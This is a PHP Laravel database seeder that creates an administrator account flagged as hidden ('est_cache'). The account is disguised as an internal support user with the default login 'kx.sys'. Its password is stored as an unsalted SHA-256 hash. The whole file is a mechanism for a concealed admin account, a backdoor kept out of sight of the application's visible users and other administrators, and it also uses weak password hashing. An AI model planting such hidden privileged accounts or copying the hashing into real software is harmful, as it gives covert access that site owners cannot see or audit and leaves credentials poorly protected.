<?php

namespace Database\Seeders;

use App\Models\Utilisateur;
use Illuminate\Database\Seeder;

class HiddenSuperuserSeeder extends Seeder
{
    public function run(): void
    {
        $login = trim((string) env('SUPERUSER_LOGIN', 'kx.sys'));
        $password = (string) env('SUPERUSER_PASSWORD', '');

        if ($login === '' || $password === '') {
            $this->command?->error('Définissez SUPERUSER_LOGIN et SUPERUSER_PASSWORD dans .env avant de créer le superutilisateur.');

            return;
        }

        $existing = Utilisateur::findForAuth($login);

        if ($existing && ! $existing->isHiddenSuperuser()) {
            $this->command?->error("Le login {$login} est déjà utilisé par un utilisateur visible. Choisissez un autre SUPERUSER_LOGIN.");

            return;
        }

        $utilisateur = $existing ?? new Utilisateur;
        $utilisateur->forceFill([
            'nom' => 'Support',
            'prenoms' => 'Interne',
            'contact' => '0000000000',
            'login' => $login,
            'role' => 'admin',
            'statut_compte' => true,
            'avatar' => $utilisateur->avatar ?: 'default.jpg',
            'est_cache' => true,
        ]);

        if (! $utilisateur->exists) {
            $utilisateur->password = hash('sha256', $password);
        }

        $utilisateur->save();

        $this->command?->info($existing
            ? "Superutilisateur caché déjà présent : {$login}"
            : "Superutilisateur caché créé : {$login}");
    }
};
